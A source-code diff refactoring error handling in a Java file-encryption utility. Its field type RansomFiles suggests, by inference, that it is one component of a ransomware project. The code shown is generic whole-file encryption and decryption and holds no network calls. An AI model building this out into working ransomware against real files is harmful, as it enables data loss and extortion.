@@ -19,40 +19,46 @@ import Agent.exceptions.CryptoException;
 public class JavaCryptoUtil {
 	private RansomFiles changeFile;
 
-	// comment2334
 	public void doCrypto(SecretKey skey, File inputFile, int cipherMode, File outputFile, String algorithm)
 			throws CryptoException {
- 
-		try {
-			SecretKey secretKey = new SecretKeySpec(skey.getEncoded(), algorithm);
-			Cipher cipher = Cipher.getInstance(algorithm);
-			cipher.init(cipherMode, secretKey);
 
-			FileInputStream inputStream = new FileInputStream(inputFile);
+		SecretKey secretKey = new SecretKeySpec(skey.getEncoded(), algorithm);
+		Cipher cipher = null;
+		try {
+			cipher = Cipher.getInstance(algorithm);
+			cipher.init(cipherMode, secretKey);
+		} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException e) {
+			throw new CryptoException("Cipher problem");
+		}
+
+		try (FileInputStream inputStream = new FileInputStream(inputFile);) {
 			byte[] inputBytes = new byte[(int) inputFile.length()];
 			inputStream.read(inputBytes);
-			byte[] outputBytes = cipher.doFinal(inputBytes);
-			FileOutputStream outputStream = new FileOutputStream(outputFile);
-			outputStream.write(outputBytes);
-
-			inputStream.close();
-			outputStream.close();
-		} catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException | BadPaddingException
-				| IllegalBlockSizeException | IOException ex) {
-			throw new CryptoException();
+			byte[] outputBytes = null;
+			try {
+				outputBytes = cipher.doFinal(inputBytes);
+			} catch (IllegalBlockSizeException | BadPaddingException e) {
+				throw new CryptoException("output stream problem");
+			}
+			try (FileOutputStream outputStream = new FileOutputStream(outputFile);) {
+				outputStream.write(outputBytes);
+				inputStream.close();
+				outputStream.close();
+			}
+		} catch (IOException e) {
+			throw new CryptoException("input stream problem");
 		}
 
 	}
 
 	public void decrypt(SecretKey skey, File fileToDecrypt, String algoritm) throws CryptoException {
-		File file = changeFile.decryptInputFile(fileToDecrypt);
-		doCrypto(skey, fileToDecrypt, Cipher.DECRYPT_MODE, file, algoritm);
+
+		doCrypto(skey, fileToDecrypt, Cipher.DECRYPT_MODE, changeFile.decryptInputFile(fileToDecrypt), algoritm);
 	}
 
 	public void encrypt(SecretKey skey, File fileToEncrypt, String algoritm) throws CryptoException {
 
-		doCrypto(skey, fileToEncrypt, Cipher.ENCRYPT_MODE,changeFile.encryptInputFile(fileToEncrypt),
-				algoritm);
+		doCrypto(skey, fileToEncrypt, Cipher.ENCRYPT_MODE, changeFile.encryptInputFile(fileToEncrypt), algoritm);
 	}
 
 }
